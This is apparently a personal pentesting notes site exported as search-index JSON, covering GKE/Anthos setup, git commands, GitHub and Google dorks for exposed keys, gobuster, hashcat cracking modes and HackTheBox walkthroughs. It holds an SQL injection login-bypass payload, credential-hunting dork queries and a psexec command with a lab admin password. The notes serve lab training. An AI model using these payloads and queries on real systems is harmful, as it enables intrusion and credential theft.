Enable APIs \ngcloud services enable \\ \n container.googleapis.com \\ \n gkeconnect.googleapis.com \\ \n gkehub.googleapis.com \\ \n cloudresourcemanager.googleapis.com \n\n# Launch GKE Cluster \ngcloud container clusters create cloud-cluster \\ \n    --machine-type=n1-standard-1 \\ \n    --num-nodes=1 \n\n# Launch Minikube. Refer to the docs at https://minikube.sigs.k8s.io/docs/  \nminikube start \n\n# Create GCP Service Account \ngcloud iam service-accounts create anthos-hub \n\n# Add IAM Role to Service Account \ngcloud projects add-iam-policy-binding $PROJECT_ID \\ \n --member=\"serviceAccount:anthos-hub@$PROJECT_ID.iam.gserviceaccount.com\" \\ \n --role=\"roles/gkehub.connect\" \n\n# Download the Service Account JSON Key \ngcloud iam service-accounts keys create \"./anthos-hub-svc.json\" \\ \n  --iam-account=\"anthos-hub@$PROJECT_ID.iam.gserviceaccount.com\" \\ \n  --project=$PROJECT_ID \n\n# Register cluster with Anthos \nURI='gcloud container clusters list --filter='name=cloud-cluster' --uri'\n\ngcloud container hub memberships register cloud-cluster \\ \n        --gke-uri=$URI \\ \n        --service-account-key-file=./anthos-hub-svc.json \n\n# List Membership \ngcloud container hub memberships list \n\n# Register Minikube with Anthos \ngcloud container hub memberships register local-cluster \\ \n --service-account-key-file=./anthos-hub-svc.json \\ \n --kubeconfig=~/.kube/config \\ \n --context=minikube \n\n# List Membership \ngcloud container hub memberships list \n\n# Create Kubernetes Role \n\nkubectl config use-context minikube \n</code></pre> <pre><code>cat &lt;&lt;EOF &gt; cloud-console-reader.yaml \nkind: ClusterRole \napiVersion: rbac.authorization.k8s.io/v1 \nmetadata: \n  name: cloud-console-reader \nrules: \n- apiGroups: [\"\"] \n  resources: [\"nodes\", \"persistentvolumes\"] \n  verbs: [\"get\", \"list\", \"watch\"] \n- apiGroups: [\"storage.k8s.io\"] \n  resources: [\"storageclasses\"] \n  verbs: [\"get\", \"list\", \"watch\"] \nEOF \n</code></pre> <pre><code>kubectl apply -f cloud-console-reader.yaml \n\n# Create RoleBinding \nkubectl create serviceaccount local-cluster \n\nkubectl create clusterrolebinding local-cluster-anthos-view \\ \n --clusterrole view \\ \n --serviceaccount default:local-cluster \n\nkubectl create clusterrolebinding cloud-console-reader-binding \\ \n --clusterrole cloud-console-reader \\ \n --serviceaccount default:local-cluster \n\n# Get the Token \nSECRET_NAME=$(kubectl get serviceaccount local-cluster -o jsonpath='{$.secrets[0].name}') \n\n# Copy the secret and paste it in the console \nkubectl get secret ${SECRET_NAME} -o jsonpath='{$.data.token}' | base64 --decode  \n\n# Delete Membership \ngcloud container hub memberships delete cloud-cluster \ngcloud container hub memberships delete local-cluster \n\n# Clean up  \ngcloud container clusters delete cloud-cluster --project=${PROJECT_ID} \ngcloud iam service-accounts delete anthos-hub@${PROJECT_ID}.iam.gserviceaccount.com \nminikube delete \n</code></pre>","tags":["cloud","google cloud platform","gcp"]},{"location":"git/","title":"Git - A version controller system for programming","text":"<p>Git is\u00a0 a distributed version control system that tracks changes in any set of computer files, usually used for coordinating work among programmers wikipedia</p>"},{"location":"git/#install","title":"Install","text":"<p>From: https://git-scm.com/</p>"},{"location":"git/#git-basic-commands","title":"Git basic commands","text":"<p>Go to your prooject folder and, then, initialize a repo with</p> <pre><code>git init\n</code></pre> <p>Once you do that, you will see a .git folder in your project folder.</p>"},{"location":"git/#git-status","title":"git status","text":"<p>This tells you what it is not still saved in the repository. These are the \"untrack\" files.</p> <pre><code>git status\n</code></pre>"},{"location":"git/#git-add","title":"git add","text":"<p>\"Git add\" add changed files/folders to the repository staging area of the branch. It tracks them. You can add a single file with:</p> <pre><code>git add &lt;file&gt;\n</code></pre> <p>You can also add a folder</p> <p><pre><code>git add &lt;folder&gt;\n</code></pre> You can add all unstaged files with a dot: </p> <pre><code>git add .\n</code></pre>"},{"location":"git/#git-rm-cached","title":"git rm --cached","text":"<p>You can unstage files from being commited</p> <pre><code>git rm --cached &lt;file&gt;\n</code></pre>"},{"location":"git/#git-commit","title":"git commit","text":"<p>Commit the changes you have staged properly with:</p> <pre><code>git commit -m \"message that describes what you have changed\"\n</code></pre> <p>To undo the most recent commit we've made:</p> <pre><code>git reset --soft HEAD~\n</code></pre>"},{"location":"git/#git-config","title":"git config","text":"<p>To setup user name and user email:</p> <pre><code>git config --global user.name \"NameOfUser\"\ngit config --global user.email \"email@email.com\"\n</code></pre>"},{"location":"git/#git-branch","title":"git branch","text":"<p>To create a new branch: <pre><code>git branch &lt;newBranchName&gt;\n</code></pre></p> <p>To list all existing branches:</p> <pre><code>git branch\n</code></pre> <p>To switch to a branch:</p> <pre><code>git checkout &lt;destinationBranch&gt;\n</code></pre> <p>To create a new branch and checkout into it in one command:</p> <p><pre><code>git checkout -b &lt;branchName&gt;\n</code></pre> To delete a branch:</p> <pre><code>git branch &lt;branchName&gt; -d\n</code></pre> <p>If you want to force the deletion (maybe some changes are not staged), then:</p> <pre><code>git branch &lt;branchName&gt; -D\n</code></pre>"},{"location":"git/#git-merge","title":"git merge","text":"<p>Having two branches (main and newbranch), to merge changes contained in newbranch to main branch, go to main branch with \"git checkout main\" and merge the new branch with:</p> <pre><code>git merge &lt;newBranch&gt;\n</code></pre>"},{"location":"git/#git-log","title":"git log","text":"<p>It displays all commits and their commit message. Every commit has an id associated. Yo can use that id for reverting changes.</p> <pre><code>git log\n</code></pre>"},{"location":"git/#git-revert","title":"git revert","text":"<p>It allows us to revert back to a previous version of our project.</p> <pre><code>git revert &lt;commitId&gt;\n</code></pre>"},{"location":"git/#gitignore","title":".gitignore","text":"<p>It's a configuration file that allows you to hide existing files and folders in your repository. Content listed there don't get pushed to a public repository. The file is called .gitignore and has one line per resource to be ignored.</p> <p>Also, important,  if a file was staged before you will need to remove it from cache...</p>"},{"location":"git/#git-remove-cached","title":"git remove --cached","text":"<p>To remove from cached files and include it later into the .gitignore file list.</p> <pre><code>git remove --cache &lt;fileName&gt;\n</code></pre>"},{"location":"git/#git-remote","title":"git remote","text":"<p>To check out which remote repository our local repository is connected to:</p> <pre><code>git remote\n</code></pre> <p>To connect my local project folder to the github repo.</p> <pre><code>git remote add origin https://github.com/username/reponame.git\n</code></pre>"},{"location":"git/#git-push","title":"git push","text":"<p>To push our local changes into the connected github repo:</p> <pre><code>git push -u origin main\n</code></pre> <p>Note: origin references the connection, and main is because we are in the main branch (that's what we are pushing). The first git push is a little different from future gitpushes, since we'll need to use the -u gflag in order to set origin as the defaulto remote repository so we won't have to provide its name every time.</p>"},{"location":"git/#some-tricks","title":"Some tricks","text":""},{"location":"git/#counting-commits","title":"Counting commits","text":"<pre><code>git rev-list --count\n</code></pre> <p>If you want to specify a branch name:</p> <pre><code>git rev-list --count &lt;branch&gt;\n</code></pre>"},{"location":"git/#backing-up-untracked-files","title":"Backing-up untracked files","text":"<p>Git, along with some Bash command piping, makes it easy to create a zip archive for your untracked files.</p> <pre><code>$ git ls-files --others --exclude-standard -z |\\\nxargs -0 tar rvf ~/backup-untracked.zip\n</code></pre>"},{"location":"git/#viewing-a-file-of-another-branch","title":"Viewing a file of another branch","text":"<p>Sometimes you want to view the content of the file from another branch. It's possible with a simple Git command, and without actually switching your branch.</p> <p>Suppose you have a file called README.md, and it's in the main branch. You're working on a branch called dev: git show main:README.md</p> <pre><code>git show &lt;branchName&gt;:&lt;fileName&gt;\n</code></pre>"},{"location":"git/#modify-author-in-commits","title":"Modify author in commits","text":"<pre><code># Make sure that the author is set globally\ngit config --global user.name \"username\"     \ngit config --global user.email \"whatever@example.com\"    \n\ngit rebase -r 787dda7 --exec 'git commit --amend --no-edit --reset-author'\n# -r: rebase until the commit\n# --exec: here we place the command to reset the author\n\ngit add .\ngit commit -m \"updating author\"\n\n# After that:\ngit push --force origin main\n</code></pre>"},{"location":"git/#pentesting-git","title":"Pentesting git","text":"<p>Source: https://thecyberpunker.com/tools/git-exposed-pentesting-git-tools/</p>"},{"location":"git/#git-dumper","title":"git-dumper","text":"<p>https://github.com/arthaud/git-dumper</p>"},{"location":"github-dorks/","title":"Github Dorks","text":"<p>Go to github.</p> Github Dowking Query Expected results applicationName api key After getting results, filter by issue and you may find some api keys. It's common to leave api keys exposed when rebasing a git repo, for instance api_key - authorization_bearer - oauth - auth - authentication - client_secret - api_token - client_id - OTP - HOMEBREW_GITHUB_API_TOKEN - SF_USERNAME - HEROKU_API_KEY - JEKYLL_GITHUB_TOKEN - api.forecast.io - password - user_password - user_pass - passcode - client_secret - secret - password hash - user auth - extension: json nasa Results show some extensions that include json, so they might be API related shodan_api_key Results show shodan api keys \"authorization: Bearer\" This search reveal some authorization token. filename: swagger.json Go to Code tab and you will have the swagger file.","tags":["reconnaissance","scanning","osint","dorking"]},{"location":"gobuster/","title":"gobuster","text":"<p>Great tool to brute force directory discovery but it's not recursive (you need to specify a directory to perform a deeper scanner). </p>"},{"location":"gobuster/#installation","title":"Installation","text":"<p>Repository: https://github.com/OJ/gobuster</p> <p>Also, dictionaries are not API-specific. But here are some commands for Gobuster:</p> <pre><code>gobuster dir -u &lt;exact target url&gt; -w &lt;/path/dic.txt&gt; -b 403,4.4 -x .php,.txt -r \n# -b: exclude from results an specific http response`\n# -r: follow redirects\n# -x: add to the path provided by dictionary these extensions\n</code></pre>"},{"location":"gobuster/#enumerate-subdomains","title":"Enumerate subdomains","text":"<p>From HackTheBox machine - Three:</p> <pre><code>gobuster vhost -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb\n# vhost : Uses VHOST for brute-forcing\n# -w : Path to the wordlist\n# -u : Specify the URL\n</code></pre>"},{"location":"gobuster/#enumerate-virtual-hosts","title":"Enumerate Virtual Hosts","text":"<p>There are a couple of things you need to prepare to brute force\u00a0<code>Host</code>\u00a0headers:</p> <ol> <li><code>Target Identification</code>: First, identify the target web server's IP address. This can be done through DNS lookups or other reconnaissance techniques.</li> <li><code>Wordlist Preparation</code>: Prepare a wordlist containing potential virtual host names. You can use a pre-compiled wordlist, such as SecLists, or create a custom one based on your target's industry, naming conventions, or other relevant information.</li> </ol> <pre><code>gobuster vhost -u http://$ip -w &lt;wordlist_file&gt; --append-domain\n# The\u00a0`-u`\u00a0flag specifies the target URL\n# The\u00a0`-w`\u00a0flag specifies the wordlist file \n# The\u00a0`--append-domain`\u00a0flag appends the base domain to each word in the wordlist. In newer versions of Gobuster, the --append-domain flag is required to append the base domain to each word in the wordlist when performing virtual host discovery. This flag ensures that Gobuster correctly constructs the full virtual hostnames, which is essential for the accurate enumeration of potential subdomains. In older versions of Gobuster, this functionality was handled differently, and the --append-domain flag was not necessary.\n</code></pre> <ul> <li>Consider using the\u00a0<code>-t</code>\u00a0flag to increase the number of threads for faster scanning.</li> <li>The\u00a0<code>-k</code>\u00a0flag can ignore SSL/TLS certificate errors.</li> <li>You can use the\u00a0<code>-o</code>\u00a0flag to save the output to a file for later analysis.</li> </ul>"},{"location":"gobuster/#examples-from-real-life","title":"Examples from real life","text":"<pre><code>gobuster dir -u https://friendzone.red/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x txt,php -t 20 -k\n\n# dir to search for directories\n# -t number of concurrent threads\n# -k to avoid error message about certificate: invalid certificate: x509: certificate has expired or is not yet valid\n# -x to indicate an extension for the file\n# -w to indicate a dictionary or wordlist\n\n\n\n# -l Display the length of the response\n# -s Show an especific status code\n# -r Follow redirect\n</code></pre>"},{"location":"google-dorks/","title":"Google Dorks","text":"","tags":["reconnaissance","scanning","osint","dorking"]},{"location":"google-dorks/#general-search-operators","title":"General search operators","text":"Operator Operator Description Example Example Description <code>site:</code> Limits results to a specific website or domain. <code>site:example.com</code> Find all publicly accessible pages on example.com. <code>inurl:</code> Finds pages with a specific term in the URL. <code>inurl:login</code> Search for login pages on any website. <code>filetype:</code> Searches for files of a particular type. <code>filetype:pdf</code> Find downloadable PDF documents. <code>intitle:</code> Finds pages with a specific term in the title. <code>intitle:\"confidential report\"</code> Look for documents titled \"confidential report\" or similar variations. <code>intext:</code>\u00a0or\u00a0<code>inbody:</code> Searches for a term within the body text of pages. <code>intext:\"password reset\"</code> Identify webpages containing the term \u201cpassword reset\u201d. <code>cache:</code> Displays the cached version of a webpage (if available). <code>cache:example.com</code> View the cached version of example.com to see its previous content. <code>link:</code> Finds pages that link to a specific webpage. <code>link:example.com</code> Identify websites linking to example.com. <code>related:</code> Finds websites related to a specific webpage. <code>related:example.com</code> Discover websites similar to example.com. <code>info:</code> Provides a summary of information about a webpage. <code>info:example.com</code> Get basic details about example.com, such as its title and description. <code>define:</code> Provides definitions of a word or phrase. <code>define:phishing</code> Get a definition of \"phishing\" from various sources. <code>numrange:</code> Searches for numbers within a specific range. <code>site:example.com numrange:1000-2000</code> Find pages on example.com containing numbers between 1000 and 2000. <code>allintext:</code> Finds pages containing all specified words in the body text. <code>allintext:admin password reset</code> Search for pages containing both \"admin\" and \"password reset\" in the body text. <code>allinurl:</code> Finds pages containing all specified words in the URL. <code>allinurl:admin panel</code> Look for pages with \"admin\" and \"panel\" in the URL. <code>allintitle:</code> Finds pages containing all specified words in the title. <code>allintitle:confidential report 2023</code> Search for pages with \"confidential,\" \"report,\" and \"2023\" in the title. <code>AND</code> Narrows results by requiring all terms to be present. <code>site:example.com AND (inurl:admin OR inurl:login)</code> Find admin or login pages specifically on example.com. <code>OR</code> Broadens results by including pages with any of the terms. <code>\"linux\" OR \"ubuntu\" OR \"debian\"</code> Search for webpages mentioning Linux, Ubuntu, or Debian. <code>NOT</code> Excludes results containing the specified term. <code>site:bank.com NOT inurl:login</code> Find pages on bank.com excluding login pages. <code>*</code>\u00a0(wildcard) Represents any character or word. <code>site:socialnetwork.com filetype:pdf user* manual</code> Search for user manuals (user guide, user handbook) in PDF format on socialnetwork.com. <code>..</code>\u00a0(range search) Finds results within a specified numerical range. <code>site:ecommerce.com \"price\" 100..500</code> Look for products priced between 100 and 500 on an e-commerce website. <code>\" \"</code>\u00a0(quotation marks) Searches for exact phrases. <code>\"information security policy\"</code> Find documents mentioning the exact phrase \"information security policy\". <code>-</code>\u00a0(minus sign) Excludes terms from the search results. <code>site:news.com -inurl:sports</code> Search for news articles on news.com excluding sports-related content.","tags":["reconnaissance","scanning","osint","dorking"]},{"location":"google-dorks/#google-dorks_1","title":"Google Dorks","text":"<p>Google hacking, also named Google dorking, is a hacker technique that uses Google Search and other Google applications to find security holes in the configuration and computer code that websites are using.   </p> <p>This is an awesome database with more than 7K googledork entries: https://www.exploit-db.com/google-hacking-database.</p> Google Dorking Query Expected results intitle:\"api\" site: \"example.com\" Finds all publicly available API related content in a given hostname. Another cool example for API versions:  inurl:\"/api/v1\" site: \"example.com\" intitle:\"json\" site: \"example.com\" Many APIs use json, so this might be a cool filter inurl:\"/wp-son/wp/v2/users\" Finds all publicly available WordPress API user directories. intitle:\"index.of\" intext:\"api.txt\" Finds publicly available API key files. inurl:\"/api/v1\" intext:\"index of /\" Finds potentially interesting API directories. intitle:\"index of\" api_key OR \"api key\" OR apiKey -pool This is one of my favorite queries. It lists potentially exposed API keys. site:*.domain.com It enumerates subdomains for the given domain \"domain.com\" site:*.domain.com filetype:pdf sales It searches for pdf files named \"sales\" in all subdomains. cache:domain.com/page It will display the google.com cache of that page. inurl:passwd.txt It retrieves pages that contains that in the url.","tags":["reconnaissance","scanning","osint","dorking"]},{"location":"gopherus/","title":"Gopherus - a tool for exploiting SSRF","text":"<p>This tool will help you to generate Gopher payload for exploiting SSRF (Server Side Request Forgery) and gaining RCE (Remote Code Execution)</p>","tags":["pentesting","web","pentesting","ssrf"]},{"location":"gopherus/#installation","title":"Installation","text":"<pre><code>git clone https://github.com/tarunkant/Gopherus.git\n\ncd Gopherus\nchmod +x install.sh\n</code></pre>","tags":["pentesting","web","pentesting","ssrf"]},{"location":"grep/","title":"grep","text":"<p>It filters out output</p> <pre><code># -C return 5 lines up and 5 lines down the line where the criteria is matched\ncat text.txt  | grep -C 5 \"password\"`\n</code></pre>","tags":["pentesting","reconnaissance"]},{"location":"hashcat/","title":"Hashcat - A password recovery tool","text":"<p>Hashcat is a password recovery tool. It had a proprietary code base until 2015, but was then released as open source software. Versions are available for Linux, OS X, and Windows. Wikipedia</p>","tags":["pentesting","enumeration","cracking tool"]},{"location":"hashcat/#installation","title":"Installation","text":"<p>Download from: https://hashcat.net/hashcat/.</p>","tags":["pentesting","enumeration","cracking tool"]},{"location":"hashcat/#basic-commands","title":"Basic commands","text":"<pre><code># Get help \nhashcat -help \n\n# To crack a hash with a dictionary\nhashcat -m 0 -a 0 -D2 example0.hash example.dict\n# -m:  to specify the module of the algorithm we\u2019ll be running. Then -m 0 specifies an MD5 type of hash\n# -a: type of attack. Then -a 0 is a dictionary attack\n# Results are stored in file hashcat.potfile\n</code></pre>","tags":["pentesting","enumeration","cracking tool"]},{"location":"hashcat/#modules","title":"Modules","text":"<p>One of the most difficult parts is setting the mode. See https://hashcat.net/wiki/doku.php?id=example_hashes.</p> <p>One common error is:</p> <pre><code>Approaching final keyspace - workload adjusted.           \nSession..........: hashcat                                \nStatus...........: Exhausted\n</code></pre> <p>To fix this, you can use the flag '-w', which is used to set the workload profile. The -w 3 flag specifically sets the workload profile to \"Insane.\"</p>","tags":["pentesting","enumeration","cracking tool"]},{"location":"hashcat/#rules","title":"Rules","text":"<p>Located at:  <code>/usr/share/hashcat/rules/</code>.</p> <p>You can create rules by creating a file called custom.rule and using these commands: https://hashcat.net/wiki/doku.php?id=rule_based_attack.</p> <p>After that use the flag -r to be able to use the rule created:</p> <pre><code>hashcat -m 0 -a 0 -D2 example0.hash example.dict -r rules/custom.rule\n\nS  \n# By clicking s you can check at any time the status\n</code></pre> <p>Generate a mutate password list based on a custom.rule:</p> <pre><code>hashcat --force password.list -r custom.rule --stdout &gt; mutated_password.list\n</code></pre>","tags":["pentesting","enumeration","cracking tool"]},{"location":"hashcat/#mask-attacks","title":"Mask attacks","text":"<p>These are the possible masks that you can use:</p> <pre><code>?l = abcdefghijklmnopqrstuvwxyz\n?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ\n?d = 0123456789\n?h = 0123456789abcdef\n?H = 0123456789ABCDEF\n?s = \u00abspace\u00bb!\"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\\]^_`{|}~\n?a = ?l?u?d?s\n?c = Capitalize the first letter and lowercase others\n?sXY = Replace all instances of X with Y.\n?b = 0x00 - 0xff\n?$!     Add the exclamation character at the end.\n</code></pre> <p>Hashcat will apply the rules of custom.rule for each word in password.list and store the mutated version in our mut_password.list accordingly. </p> <p>Example of a mask attack:</p> <pre><code>hashcat -m 0 -a 3 example0.hash ?l?l?l?l?L?l?l?la  \n# first 8 letter will be lowercase and the ninth one will be from the all-character pool\n</code></pre> <p>Hashcat and John come with pre-built rule lists that we can use for our password generating and cracking purposes. One of the most used rules is best64.rule</p>","tags":["pentesting","enumeration","cracking tool"]},{"location":"hashcat/#cracking-password-of-microsoft-word-file","title":"Cracking Password of Microsoft Word file","text":"<pre><code>cd /root/Desktop/\n/usr/share/john/office2john.py MS_Word_Document.docx &gt; hash\n\ncat hash\n\nMS_Word_Document.docx:$office$*2013*100000*256*16*ff2563844faca58a12fc42c5036f9cf8*ffaf52db903dbcb6ac2db4bab6d343ab*c237403ec97e5f68b7be3324a8633c9ff95e0bb44b1efcf798c70271a54336a2\n\nRemove the first part. Hash would be\n$office$*2013*100000*256*16*ff2563844faca58a12fc42c5036f9cf8*ffaf52db903dbcb6ac2db4bab6d343ab*c237403ec97e5f68b7be3324a8633c9ff95e0bb44b1efcf798c70271a54336a2\n\nhashcat -a 0 -m 9600 --status hash /root/Desktop/wordlists/1000000-password-seclists.txt --force\n# -a 0: dictionary mode\n# -m 9600: Set method to MS Office 2013\n# --status : Enable automatic update of the status screen\n</code></pre>","tags":["pentesting","enumeration","cracking tool"]},{"location":"hashcat/#resources","title":"Resources","text":"<p>Examples: cracking common hashes: https://infosecwriteups.com/cracking-hashes-with-hashcat-2b21c01c18ec.</p>","tags":["pentesting","enumeration","cracking tool"]},{"location":"hashcat/#modules-cheatsheet","title":"Modules cheatsheet","text":"<p>https://hashcat.net/wiki/doku.php?id=example_hashes</p>","tags":["pentesting","enumeration","cracking tool"]},{"location":"hashcat/#mode-1000-ntlm-hash","title":"mode 1000: NTLM hash","text":"<pre><code>hashcat -m 1000 -a 0 hashes.txt /path/to/wordlist.txt`\n#  `-m 1000`: Specifies that the hash type is NTLM.\n#  `-a 0`: The attack mode (`0` is a dictionary attack).\n# `hashes.txt`: The file containing your NTLM hash.\n# `/path/to/wordlist.txt`: The path to your wordlist (for example,  /usr/share/wordlists/rockyou.txt`).\n</code></pre>","tags":["pentesting","enumeration","cracking tool"]},{"location":"hashcat/#mode-7300-ipmi","title":"mode 7300: IPMI","text":"<p>For cracking hashes from IPMI service: In the event of an HP iLO using a factory default password, we can use this Hashcat mask attack command </p> <pre><code>hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u\n</code></pre>","tags":["pentesting","enumeration","cracking tool"]},{"location":"hashcat/#module-5600","title":"Module 5600","text":"<p>All saved Hashes are located in Responder's logs directory (/usr/share/responder/logs/). We can copy the hash to a file and attempt to crack it using the hashcat module 5600.</p> <pre><code>hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt\n</code></pre>","tags":["pentesting","enumeration","cracking tool"]},{"location":"hashcat/#mode-1800-unshadow-file","title":"Mode 1800: unshadow file","text":"<pre><code>hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked\n</code></pre>","tags":["pentesting","enumeration","cracking tool"]},{"location":"hashcat/#module-13100-kerberos-rc4","title":"Module 13100: kerberos RC4","text":"<pre><code>hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt \n</code></pre>","tags":["pentesting","enumeration","cracking tool"]},{"location":"hashcat/#module-19700-kerberos-aes","title":"Module 19700: kerberos AES","text":"<pre><code>hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt \n</code></pre>","tags":["pentesting","enumeration","cracking tool"]},{"location":"hashcat/#module-18200-kerberos-asrep","title":"Module 18200: kerberos asrep","text":"","tags":["pentesting","enumeration","cracking tool"]},{"location":"honeypots/","title":"Honeypots","text":"<p>Typical honeypots (somehow old):</p> <ul> <li>Kipo </li> <li>Dionaea: fake an smb server. </li> <li>T-Pot</li> <li>Elasticpot</li> <li>https://github.com/mushorg/conpot</li> </ul> <p>Course: https://formacion.seguridadsi.com/</p> <p>Typical honeypots: old OS, outdated apps, registry keys, juicy files, ports, open services, change server banners, etc.</p> <p>Metaphor for an active defense: leave an open house knowing that there are thieves  in the area.</p> <p>Interesting acronyms:</p> <ul> <li>MTTD -  MeanTimeToDetect</li> <li>MTTR -  MeanTimeToRecover</li> </ul> <p>Nmap and Nuclei already have options and flags for detecting honeypots. </p> <p>Some other honeypots:  - Active Defense Harbinger Distribution (ADHD) </p>","tags":["exploitation","technique","honeypots"]},{"location":"honeypots/#installation","title":"Installation","text":"<ol> <li>Use canary for creating an alert  https://canarytokens.org/nest/ Use the module \"# Create JS cloned website Token\"</li> </ol> <p>For instance, in js.</p> <ol> <li>Use https://js.do/ to execute the code</li> </ol> <p>You will get an email. Also you can create a webhook</p> <p>Others:  RDP, Folder DNS (adding a DNS route in the location of the icon of the folder) Create an user Service, that creates a service, enabled, but not authorized to login at any time. </p> <p>Simulate request LLMNR (Local Link Multicast Name Resolution). We can use invoke-honeycreds.ps1 from github.</p> <p>Techniques to get the whoami without asking whoami.</p> <p>https://formacion.seguridadsi.com/courses/take/especialista-en-honeypots-y-sistemas-de-decepcion</p>","tags":["exploitation","technique","honeypots"]},{"location":"how-to-resolve-run-of-the-mill/","title":"How to resolve run-of-the-mill","text":"","tags":["dns","ping","connection","problems"]},{"location":"how-to-resolve-run-of-the-mill/#connection-problems","title":"... connection problems","text":"<pre><code># Check connection\nping 8.8.8.8\n\n# Check domain resolver\nping google.com\n\n# If pinging 8.8.8.8 works but pinging google.com doesn't, check dns file resolver\n    # Add a new line: \n    # nameserver 8.8.8.8\nsudo nano /etc/resolv.conf\n\n# Check wired connections\nsudo service networking\n</code></pre>","tags":["dns","ping","connection","problems"]},{"location":"how-to-resolve-run-of-the-mill/#prevent-etcresolvconf-from-updating","title":"Prevent /etc/resolv.conf from updating","text":"<p>By default, NetworkManager  dynamically updates the\u00a0<code>/etc/resolv.conf</code>\u00a0file with the DNS settings from active NetworkManager connection profiles. However, you can disable this behavior and manually configure DNS settings in\u00a0<code>/etc/resolv.conf</code>. Steps:</p> <p>1.  As the root user, create the\u00a0<code>/etc/NetworkManager/conf.d/90-dns-none.conf</code>\u00a0file with the following content by using a text editor:</p> <pre><code>[main]\ndns=none\n</code></pre> <p>2.  Reload the\u00a0NetworkManager\u00a0service:</p> <pre><code>systemctl reload NetworkManager\n</code></pre> <p>After you reload the service, NetworkManager no longer updates the\u00a0<code>/etc/resolv.conf</code>\u00a0file. However, the last contents of the file are preserved.</p> <p>3.  Optionally, remove the\u00a0\"Generated by NetworkManager\" comment from\u00a0/etc/resolv.conf\u00a0to avoid confusion.</p> <p>Verification</p> <p>1.  Edit the\u00a0/etc/resolv.conf\u00a0file and manually update the configuration.</p> <p>2.  Reload the NetworkManager\u00a0service:</p> <p><pre><code>systemctl reload NetworkManager\n````   \n\n**3.**  Display the\u00a0/etc/resolv.conf\u00a0file:\n</code></pre> cat /etc/resolv.conf <pre><code> If you successfully disabled DNS processing, NetworkManager did not override the manually configured settings.\n\n\n## ...issues with screen monitors\n\nXrandr is used to set the size, orientation and/or reflection of the outputs for a screen. It can also set the screen size.\n</code></pre></p>","tags":["dns","ping","connection","problems"]},{"location":"how-to-resolve-run-of-the-mill/#see-commands-and-usage","title":"See commands and usage","text":"<p>man xrandr</p>","tags":["dns","ping","connection","problems"]},{"location":"how-to-resolve-run-of-the-mill/#list-current-settings","title":"List current settings","text":"<p>xrandr</p>","tags":["dns","ping","connection","problems"]},{"location":"how-to-resolve-run-of-the-mill/#also-for-listing-current-settings","title":"Also, for listing current settings","text":"<p>xrandr --current <pre><code>Listing current settings helps you out to see the name of the outputs of your screens.\n\nIn my case:\n\n```shell-session\n# Place laptop to the left of DP-2 (27'')\nxrandr --output eDP-1  --left-of DP-2\n\n# Place 34'' to the right of DP-2 (27'')\nxrandr --output HDMI-1 --right-of DP-2\n\n# Rotate 27''\nxrandr --output DP-2  --rotate left \n</code></pre></p>","tags":["dns","ping","connection","problems"]},{"location":"how-to-resolve-run-of-the-mill/#issues-with-monitor-recognized-but-not-displayed","title":"... issues with monitor recognized but not displayed","text":"<p>Weird key sequence:</p> <p>Ctrl-Alt-F3, Ctrl-Alt-F7</p>","tags":["dns","ping","connection","problems"]},{"location":"htb-appointment/","title":"Appointment - A HackTheBox machine","text":"<pre><code>nmap -sC -A $ip -Pn\n</code></pre> <p>Only port 80 is open.</p> <p>It's a login panel with an SQL injection vulnerability.</p> <p>To access, enter in username: 1' OR '1'='1';#</p>","tags":["walkthrough"]},{"location":"htb-archetype/","title":"Archetype - A Hack the Box machine","text":"<pre><code>nmap  -sC -sV $ip -Pn\n</code></pre> <p>Open ports: 135, 139, 445, 1433.</p> <p>First, exploit 445. With smbclient, you will download the fileprod.dtsConfig with credentials for mssql database.</p> <p>With those credentials you can follow instructions from this impacket module and next instructions to exploit it and get a reverse shell with nc64.exe.</p> <p>With that, you will get user.txt in Desktop.</p> <p>For escalation of privileges, see technique Recently accessed files and executed commands. </p> <pre><code>type C:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\n</code></pre> <p>With admin credentials, you can use impacket's psexec.py module to get an interactive shell on the Windows host with admin rights.</p> <pre><code>python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator:MEGACORP_4dm1n\\!\\!@10.129.95.187\n</code></pre>","tags":["walkthrough"]},{"location":"htb-bank/","title":"Bank - A HackTheBox machine","text":"<p>The entire exploitation of this machine depends on:</p> <ul> <li>reconnaissance phase: being able to determine that some \"dns digging\" or \"/etc/host\" changes must be done. Also, there is some guessing. You need to assume that bank.htb is a valid domain for a dns transfer... mmm weird.</li> <li>enumeration phase: using the right dictionary to locate a data breach with password for accessing.</li> </ul> <p>Later on, other skills are appreciated, such as reading comments on source code. </p>","tags":["walkthrough","enumeration","reverse shell","suid binaries"]},{"location":"htb-bank/#users-flag","title":"User's flag","text":"","tags":["walkthrough","enumeration","reverse shell","suid binaries"]},{"location":"htb-bank/#reconnaisance","title":"Reconnaisance","text":"<pre><code>nmap -sV -sC -Pn  -p-\n</code></pre> <p>Results:</p> <pre><code>PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   1024 08eed030d545e459db4d54a8dc5cef15 (DSA)\n|   2048 b8e015482d0df0f17333b78164084a91 (RSA)\n|   256 a04c94d17b6ea8fd07fe11eb88d51665 (ECDSA)\n|_  256 2d794430c8bb5e8f07cf5b72efa16d67 (ED25519)\n53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)\n| dns-nsid: \n|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu\n80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))\n| http-title: HTB Bank - Login\n|_Requested resource was login.php\n|_http-server-header: Apache/2.4.7 (Ubuntu)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre> <p>Let's check UDP connections to port 53:</p> <pre><code>sudo nmap -sU -sC -sV -Pn 10.129.29.200 -p53\n</code></pre> <p>Results:</p> <pre><code>PORT   STATE 